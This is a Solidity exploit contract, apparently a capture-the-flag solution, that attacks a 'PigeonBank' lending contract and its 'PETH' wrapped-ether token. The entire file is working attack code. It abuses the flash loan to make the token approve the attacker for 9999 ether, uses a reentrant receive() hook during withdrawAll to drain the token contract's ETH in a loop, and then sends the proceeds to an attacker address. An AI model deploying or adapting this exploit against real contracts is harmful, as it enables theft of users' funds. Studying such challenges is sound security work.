// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./PETH.sol";
import "./PigeonBank.sol";

contract PigeonBankExploit {
    PETH public immutable peth;
    PigeonBank public immutable pigeonBank;
    address payable public immutable attacker;

    bool public isPwning;

    constructor(address _peth, address _pigeonBank, address payable _attacker) {
        peth = PETH(payable(_peth));
        pigeonBank = PigeonBank(payable(_pigeonBank));
        attacker = _attacker;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a < b) {
            return a;
        }
        return b;
    }

    function exploit() external {
        // pigeonBank.deposit{value: 10 ether}(); // exploit gets 10 PETH
        pigeonBank.flashLoan(
            address(peth), abi.encodeWithSignature("approve(address,uint256)", address(this), 9999 ether), 0
        );

        while (address(peth).balance != 0) {
            // commence attack with min(yourBalance, targetBalance)
            uint256 amount = _min(address(this).balance, address(peth).balance);

            // deposit WETH
            pigeonBank.deposit{value: amount}();

            // withdraw WETH, will enter `receive`
            isPwning = true;
            pigeonBank.withdrawAll();
            isPwning = false;

            // transferFrom back your WETH10
            peth.transferFrom(address(peth), address(this), amount);

            // withdraw for real to get extra ETH for your WETH10
            pigeonBank.withdrawAll();
        }

        // Transfer to attacker
        (bool success,) = attacker.call{value: address(this).balance}("");
        require(success, "Failed to transfer ETH to attacker");
    }

    receive() external payable {
        if (isPwning) {
            peth.transfer(address(peth), msg.value);
        }
    }
}
